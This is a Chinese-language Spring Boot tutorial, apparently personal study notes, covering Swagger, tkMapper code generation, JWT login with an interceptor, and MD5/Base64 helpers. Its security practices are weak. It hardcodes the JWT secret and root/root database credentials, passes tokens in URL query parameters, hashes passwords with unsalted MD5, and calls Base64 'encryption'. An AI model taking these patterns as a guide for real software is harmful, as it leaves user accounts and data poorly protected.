<p>@ApiModel 当接口参数和返回值类型为对象类型是需要添加此注解</p>
<pre><code class="hljs reasonml">@<span class="hljs-constructor">ApiModel(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;ResultVO对象&quot;</span>,<span class="hljs-params">description</span> = <span class="hljs-string">&quot;封装接口返回给前端的数据&quot;</span>)</span></code></pre>

<p>@ApiModelProperty 模型中的成员变量进行说明</p>
<pre><code class="hljs reasonml">@<span class="hljs-constructor">ApiModelProperty(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;响应状态码&quot;</span>,<span class="hljs-params">dataType</span> = <span class="hljs-string">&quot;int&quot;</span>)</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> code;</code></pre>

<p>@ApiIngnore接口方法注解，添加此注解的方法不会出现在接口文档中</p>
<h2 id="4-swagger-ui插件"><a href="#4-swagger-ui插件" class="headerlink" title="4.swagger-ui插件"></a>4.swagger-ui插件</h2><p>导入插件依赖</p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--swagger-ui插件依赖--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<p>访问url:<a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a> ,ui界面设计更加美观</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710133641781.png" alt="image-20220710133641781"></p>
<h1 id="tkMapper"><a href="#tkMapper" class="headerlink" title="tkMapper"></a>tkMapper</h1><p>整合tkmapper</p>
<h2 id="1-导入依赖-2"><a href="#1-导入依赖-2" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tk.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mapper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>



<h2 id="2-配置application-yml文件"><a href="#2-配置application-yml文件" class="headerlink" title="2.配置application.yml文件"></a>2.配置application.yml文件</h2><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">druid:</span>
      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false</span>
<span class="hljs-attr">mybatis:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mapper/*Mapper.xml</span>
  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.sunzy.fmmall.dao</span></code></pre>

<h2 id="3-修改启动类"><a href="#3-修改启动类" class="headerlink" title="3.修改启动类"></a>3.修改启动类</h2><p>注意MapperScan需要使用tkmapper包中的</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.tkmapper;

<span class="hljs-comment">//import org.mybatis.spring.annotation.MapperScan;</span>
<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> tk.mybatis.spring.annotation.MapperScan;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-comment">//@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;)</span>
<span class="hljs-meta">@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TkmapperDemoApplication</span> </span>&#123;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
        SpringApplication.run(TkmapperDemoApplication.class, args);
    &#125;

&#125;
</code></pre>

<h2 id="4-逆向工程"><a href="#4-逆向工程" class="headerlink" title="4.逆向工程"></a>4.逆向工程</h2><p>导入插件依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.generator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
                   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
                   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tk.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mapper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
               <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
           <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre>

<p>添加配置文件GeneratorConfig.xml</p>
<p>记得修改对应包名<code>&lt;!--**--&gt;</code>标记处需要修改</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">generatorConfiguration</span></span>
<span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration</span></span>
<span class="hljs-meta"><span class="hljs-meta-string">1.0//EN&quot;</span></span>
<span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">generatorConfiguration</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引⼊数据库连接配置 --&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Mysql&quot;</span> <span class="hljs-attr">targetRuntime</span>=<span class="hljs-string">&quot;MyBatis3Simple&quot;</span></span>
<span class="hljs-tag">             <span class="hljs-attr">defaultModelType</span>=<span class="hljs-string">&quot;flat&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;beginningDelimiter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;`&quot;</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;endingDelimiter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;`&quot;</span>/&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置 GeneralDAO --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;</span>&gt;</span> 
            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mappers&quot;</span></span>
<span class="hljs-tag">                      <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.general.GeneralDao&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置数据库连接 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">jdbcConnection</span> <span class="hljs-attr">driverClass</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span></span>
<span class="hljs-tag">                        <span class="hljs-attr">connectionURL</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/fmmall?useSSL=false&quot;</span> </span>
<span class="hljs-tag">                        <span class="hljs-attr">userId</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">jdbcConnection</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置实体类存放路径 --&gt;</span>
        &lt;javaModelGenerator
                targetPackage=&quot;com.sunzy.fmmall.entity&quot;
                targetProject=&quot;src/main/java&quot;/&gt;   <span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置 XML 存放路径 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sqlMapGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;/&quot;</span></span>
<span class="hljs-tag">                         <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/resources/mapper&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置 DAO 存放路径 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">javaClientGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao&quot;</span></span>
<span class="hljs-tag">                             <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/java&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;XMLMAPPER&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置需要指定⽣成的数据库和表，% 代表所有表 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">tableName</span>=<span class="hljs-string">&quot;%&quot;</span>&gt;</span>
            <span class="hljs-comment">&lt;!-- mysql 配置 --&gt;</span>
            <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;Mysql&quot;</span>
<span class="hljs-comment">            identity=&quot;true&quot;/&gt;--&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;table tableName=&quot;tb_roles&quot;&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;roleid&quot; sqlStatement=&quot;Mysql&quot;</span>
<span class="hljs-comment">        identity=&quot;true&quot;/&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;/table&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;table tableName=&quot;tb_permissions&quot;&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;perid&quot; sqlStatement=&quot;Mysql&quot;</span>
<span class="hljs-comment">        identity=&quot;true&quot;/&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;/table&gt;--&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">generatorConfiguration</span>&gt;</span></code></pre>

<p>创建<code>com.sunzy.fmmall.general.GeneralDao</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.general;

<span class="hljs-keyword">import</span> tk.mybatis.mapper.common.Mapper;
<span class="hljs-keyword">import</span> tk.mybatis.mapper.common.MySqlMapper;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">Mapper</span>&lt;<span class="hljs-title">T</span>&gt;, <span class="hljs-title">MySqlMapper</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;
&#125;
</code></pre>

<p>在pom.xml中添加配置文件的位置</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710225357498.png" alt="image-20220710225357498"></p>
<p>使用插件进行代码生成</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710225431382.png" alt="image-20220710225431382"></p>
<h1 id="JWT实现登录权限认证"><a href="#JWT实现登录权限认证" class="headerlink" title="JWT实现登录权限认证"></a>JWT实现登录权限认证</h1><h2 id="1-导入JWT依赖"><a href="#1-导入JWT依赖" class="headerlink" title="1.导入JWT依赖"></a>1.导入JWT依赖</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.10.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h2 id="2-生成对应的token并返回给前端"><a href="#2-生成对应的token并返回给前端" class="headerlink" title="2.生成对应的token并返回给前端"></a>2.生成对应的token并返回给前端</h2><pre><code class="hljs java"><span class="hljs-comment">// 验证成功则生成对应的token</span>
<span class="hljs-comment">// 使用jwt生成token</span>
JwtBuilder builder = Jwts.builder();
Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
map.put(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
map.put(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
JwtBuilder jwtBuilder = builder.setSubject(username)    <span class="hljs-comment">//设置subject</span>
    .setIssuedAt(<span class="hljs-keyword">new</span> Date())        <span class="hljs-comment">// 设置token生成的时间</span>
    .setId(user.getUserId() + <span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// 设置userid为token的唯一id</span>
    .setClaims(map)                 <span class="hljs-comment">// map中可以存放用户的角色和权限信息</span>
    .setExpiration(<span class="hljs-keyword">new</span> Date(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> * <span class="hljs-number">2</span>))               <span class="hljs-comment">// 设置token的过期时间 为两天</span>
    .signWith(SignatureAlgorithm.HS256, <span class="hljs-string">&quot;sunzy123456&quot;</span>);<span class="hljs-comment">// 设置token的加密方式和加密密钥</span>

String token = jwtBuilder.compact();   <span class="hljs-comment">// 获取token</span>
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, token, user);</code></pre>

<h2 id="3-前端进行登录验证时获取对应的token"><a href="#3-前端进行登录验证时获取对应的token" class="headerlink" title="3.前端进行登录验证时获取对应的token"></a>3.前端进行登录验证时获取对应的token</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220711172838166.png" alt="image-20220711172838166"></p>
<h2 id="4-JWT进行token解析"><a href="#4-JWT进行token解析" class="headerlink" title="4.JWT进行token解析"></a>4.JWT进行token解析</h2><pre><code class="hljs java"><span class="hljs-keyword">if</span>(token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);
&#125;<span class="hljs-keyword">else</span> &#123;
    JwtParser parser = Jwts.parser();
    parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
    <span class="hljs-keyword">try</span>&#123;
        <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
        Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
        Claims body = claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
        String subject = body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
        String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
    &#125;<span class="hljs-keyword">catch</span>(UnsupportedJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;token不合法请重新登录！&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;<span class="hljs-keyword">catch</span>(ExpiredJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;
    <span class="hljs-keyword">catch</span> (Exception e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;未知错误&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;</code></pre>

<h2 id="5-使用拦截器验证token"><a href="#5-使用拦截器验证token" class="headerlink" title="5.使用拦截器验证token"></a>5.使用拦截器验证token</h2><ul>
<li><p>创建拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.interceptor;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.jsonwebtoken.*;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.PrintWriter;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
        String token = request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);

        <span class="hljs-keyword">if</span> (token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token)) &#123;
            doResponse(response, <span class="hljs-string">&quot;请先登录！&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            JwtParser parser = Jwts.parser();
            parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
            <span class="hljs-keyword">try</span> &#123;
                <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
                Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
                Claims body = claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
                String subject = body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
                String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">catch</span> (UnsupportedJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token不合法，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (ExpiredJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                doResponse(response,<span class="hljs-string">&quot;未知错误！&quot;</span>);
            &#125;

            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        &#125;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title">doResponse</span><span class="hljs-params">(HttpServletResponse response, String msg)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
        ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, msg, <span class="hljs-keyword">null</span>);
        String string = JSON.toJSONString(resultVO);
        response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);
        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
        PrintWriter writer = response.getWriter();
        writer.write(string);
        writer.flush();
        writer.close();
    &#125;

&#125;
</code></pre>



</li>
</ul>
<ul>
<li><p>配置拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.interceptor.CheckTokenInterceptor;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 拦截器的配置类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CheckTokenInterceptor checkTokenInterceptor;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;
        <span class="hljs-comment">// registry是拦截器的注册器</span>
        <span class="hljs-comment">// 将自己创建的拦截器加入进来 即可实现拦截功能</span>
        registry.addInterceptor(checkTokenInterceptor)
        .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">// 拦截所有路径</span>
        .excludePathPatterns(<span class="hljs-string">&quot;/user/**&quot;</span>); <span class="hljs-comment">// 除了用户登录和注册路径</span>
    &#125;
&#125;
</code></pre>

</li>
</ul>
<h1 id="加密使用到工具类"><a href="#加密使用到工具类" class="headerlink" title="加密使用到工具类"></a>加密使用到工具类</h1><h2 id="1-md5"><a href="#1-md5" class="headerlink" title="1.md5"></a>1.md5</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.utils;

<span class="hljs-keyword">import</span> java.math.BigInteger;
<span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;

<span class="hljs-comment">//MD5 生成器</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MD5Utils</span> </span>&#123;
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">md5</span><span class="hljs-params">(String password)</span></span>&#123;
		<span class="hljs-comment">//生成一个md5加密器</span>
		<span class="hljs-keyword">try</span> &#123;
			MessageDigest md = MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);
			<span class="hljs-comment">//计算MD5 的值</span>
			md.update(password.getBytes());
			<span class="hljs-comment">//BigInteger 将8位的字符串 转成16位的字符串 得到的字符串形式是哈希码值</span>
			<span class="hljs-comment">//BigInteger(参数1,参数2) 参数1 是 1为正数 0为0 -1为负数</span>
			<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> BigInteger(<span class="hljs-number">1</span>, md.digest()).toString(<span class="hljs-number">16</span>);
		&#125; <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e) &#123;
			e.printStackTrace();
		&#125;
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
	&#125;
&#125;
</code></pre>

<h2 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.utils;

<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-comment">//base64 加密 解密 激活邮件的时候 为 邮箱地址 code验证码 进行加密</span>
<span class="hljs-comment">//当 回传回来后 进行邮箱地址 和 code 的解密</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base64Utils</span> </span>&#123;
	<span class="hljs-comment">//加密</span>
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">encode</span><span class="hljs-params">(String msg)</span></span>&#123;
		<span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(msg.getBytes());
	&#125;
	<span class="hljs-comment">//解密</span>
	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">decode</span><span class="hljs-params">(String msg)</span></span>&#123;
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(Base64.getDecoder().decode(msg));
	&#125;
&#125;
</code></pre>



<p>​     </p>
<h1 id="logback日志"><a href="#logback日志" class="headerlink" title="logback日志"></a>logback日志</h1><h2 id="添加xml文件"><a href="#添加xml文件" class="headerlink" title="添加xml文件"></a>添加xml文件</h2><p>在springboot项目的resource目录下创建logback-spring.xml文件</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>

